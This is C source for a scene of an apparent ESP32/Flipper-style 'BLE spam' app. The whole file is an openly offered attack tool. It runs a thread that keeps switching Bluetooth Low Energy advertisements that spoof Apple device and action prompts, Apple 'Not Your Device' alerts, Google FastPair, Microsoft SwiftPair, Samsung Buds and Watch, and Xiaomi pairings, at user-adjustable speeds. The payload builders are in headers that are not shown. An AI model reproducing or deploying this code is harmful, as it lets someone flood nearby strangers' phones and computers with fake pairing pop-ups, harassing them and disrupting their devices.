#include "../ble_spam_app.h"
#include "../ble_spam_hal.h"
#include "../ble_spam_payloads.h"
#include "../views/ble_spam_view.h"

#include <esp_log.h>
#include <string.h>

#define TAG BLE_SPAM_LOG_TAG

static const char* attack_short_names[] = {
    [BleSpamAttackAppleDevice] = "Apple Device",
    [BleSpamAttackAppleAction] = "Apple Action",
    [BleSpamAttackAppleNotYourDevice] = "Apple NYD",
    [BleSpamAttackFastPair] = "FastPair",
    [BleSpamAttackSwiftPair] = "SwiftPair",
    [BleSpamAttackSamsungBuds] = "Samsung Buds",
    [BleSpamAttackSamsungWatch] = "Samsung Watch",
    [BleSpamAttackXiaomi] = "Xiaomi",
};

static const uint32_t speed_steps[] = {50, 100, 150, 200, 300, 500};
#define SPEED_STEP_COUNT (sizeof(speed_steps) / sizeof(speed_steps[0]))

static FuriThread* s_spam_thread = NULL;

static uint8_t build_next_payload(BleSpamApp* app, uint8_t* buf) {
    uint8_t len = 0;
    const char* name = "";

    switch(app->attack_type) {
    case BleSpamAttackAppleDevice: {
        uint16_t idx = app->current_index % APPLE_DEVICE_COUNT;
        name = apple_devices[idx].name;
        len = ble_spam_build_apple_proximity(buf, apple_devices[idx].device_id);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackAppleAction: {
        uint16_t idx = app->current_index % APPLE_ACTION_COUNT;
        name = apple_actions[idx].name;
        len = ble_spam_build_apple_nearby_action(buf, apple_actions[idx].action_id, apple_actions[idx].flags);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackAppleNotYourDevice: {
        uint16_t idx = app->current_index % APPLE_DEVICE_COUNT;
        name = apple_devices[idx].name;
        len = ble_spam_build_apple_not_your_device(buf, apple_devices[idx].device_id);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackFastPair: {
        uint16_t idx = app->current_index % FASTPAIR_MODEL_COUNT;
        name = "FastPair";
        len = ble_spam_build_fastpair(buf, fastpair_models[idx]);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackSwiftPair: {
        uint16_t total = SWIFTPAIR_NAME_COUNT + SWIFTPAIR_HEADPHONE_COUNT;
        uint16_t idx = app->current_index % total;
        if(idx < SWIFTPAIR_NAME_COUNT) {
            name = swiftpair_names[idx];
            len = ble_spam_build_swiftpair(buf, swiftpair_names[idx]);
        } else {
            uint16_t hp_idx = idx - SWIFTPAIR_NAME_COUNT;
            name = swiftpair_headphone_names[hp_idx];
            len = ble_spam_build_swiftpair_headphone(buf, swiftpair_headphone_names[hp_idx]);
        }
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackSamsungBuds: {
        uint16_t idx = app->current_index % SAMSUNG_BUDS_COUNT;
        name = samsung_buds[idx].name;
        len = ble_spam_build_samsung_buds(buf, samsung_buds[idx].r, samsung_buds[idx].g, samsung_buds[idx].b);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackSamsungWatch: {
        uint16_t idx = app->current_index % SAMSUNG_WATCH_COUNT;
        name = samsung_watches[idx].name;
        len = ble_spam_build_samsung_watch(buf, samsung_watches[idx].watch_id);
        app->current_index = idx + 1;
        break;
    }
    case BleSpamAttackXiaomi:
        name = "Xiaomi Device";
        len = ble_spam_build_xiaomi(buf);
        break;
    default:
        break;
    }

    strncpy(app->current_device, name, sizeof(app->current_device) - 1);
    app->current_device[sizeof(app->current_device) - 1] = '\0';
    return len;
}

static int32_t spam_thread_fn(void* arg) {
    BleSpamApp* app = arg;
    ESP_LOGI(TAG, "Spam thread started (attack=%d)", app->attack_type);

    while(app->running) {
        ble_spam_hal_stop_adv();

        uint8_t payload[31];
        uint8_t len = build_next_payload(app, payload);

        if(len > 0) {
            bool ok = ble_spam_hal_set_adv_data(payload, len);
            app->packet_count++;
            if(app->packet_count <= 3) {
                ESP_LOGI(TAG, "Cycle %lu: len=%d, ok=%d, device='%s'",
                         (unsigned long)app->packet_count, len, ok, app->current_device);
            }
        } else {
            ESP_LOGW(TAG, "build_next_payload returned 0!");
        }

        furi_delay_ms(app->delay_ms);
    }

    ble_spam_hal_stop_adv();
    ESP_LOGI(TAG, "Spam thread stopped, %lu packets", (unsigned long)app->packet_count);
    return 0;
}

void ble_spam_scene_running_on_enter(void* context) {
    BleSpamApp* app = context;

    app->running = false;
    app->packet_count = 0;
    app->delay_ms = 100;
    app->current_index = 0;
    app->current_device[0] = '\0';

    if(!ble_spam_hal_start()) {
        ESP_LOGE(TAG, "BLE HAL init failed");
        scene_manager_previous_scene(app->scene_manager);
        return;
    }

    BleSpamRunningModel* model = view_get_model(app->view_running);
    strncpy(model->attack_name, attack_short_names[app->attack_type], sizeof(model->attack_name) - 1);
    model->attack_name[sizeof(model->attack_name) - 1] = '\0';
    model->device_name[0] = '\0';
    model->packet_count = 0;
    model->delay_ms = app->delay_ms;
    model->running = false;
    view_commit_model(app->view_running, true);

    view_dispatcher_switch_to_view(app->view_dispatcher, BleSpamViewRunning);
}

bool ble_spam_scene_running_on_event(void* context, SceneManagerEvent event) {
    BleSpamApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == BleSpamCustomEventToggle) {
            if(!app->running) {
                app->running = true;
                s_spam_thread = furi_thread_alloc();
                furi_thread_set_name(s_spam_thread, "BleSpam");
                furi_thread_set_stack_size(s_spam_thread, 4096);
                furi_thread_set_context(s_spam_thread, app);
                furi_thread_set_callback(s_spam_thread, spam_thread_fn);
                furi_thread_start(s_spam_thread);
            } else {
                app->running = false;
                if(s_spam_thread) {
                    furi_thread_join(s_spam_thread);
                    furi_thread_free(s_spam_thread);
                    s_spam_thread = NULL;
                }
            }
            consumed = true;
        } else if(event.event == BleSpamCustomEventSpeedUp) {
            for(int i = SPEED_STEP_COUNT - 1; i >= 0; i--) {
                if(speed_steps[i] < app->delay_ms) {
                    app->delay_ms = speed_steps[i];
                    break;
                }
            }
            consumed = true;
        } else if(event.event == BleSpamCustomEventSpeedDown) {
            for(size_t i = 0; i < SPEED_STEP_COUNT; i++) {
                if(speed_steps[i] > app->delay_ms) {
                    app->delay_ms = speed_steps[i];
                    break;
                }
            }
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        BleSpamRunningModel* model = view_get_model(app->view_running);
        model->packet_count = app->packet_count;
        model->delay_ms = app->delay_ms;
        model->running = app->running;
        strncpy(model->device_name, app->current_device, sizeof(model->device_name) - 1);
        model->device_name[sizeof(model->device_name) - 1] = '\0';
        view_commit_model(app->view_running, true);
    }

    return consumed;
}

void ble_spam_scene_running_on_exit(void* context) {
    BleSpamApp* app = context;

    if(app->running) {
        app->running = false;
        if(s_spam_thread) {
            furi_thread_join(s_spam_thread);
            furi_thread_free(s_spam_thread);
            s_spam_thread = NULL;
        }
    }

    ble_spam_hal_stop();
}
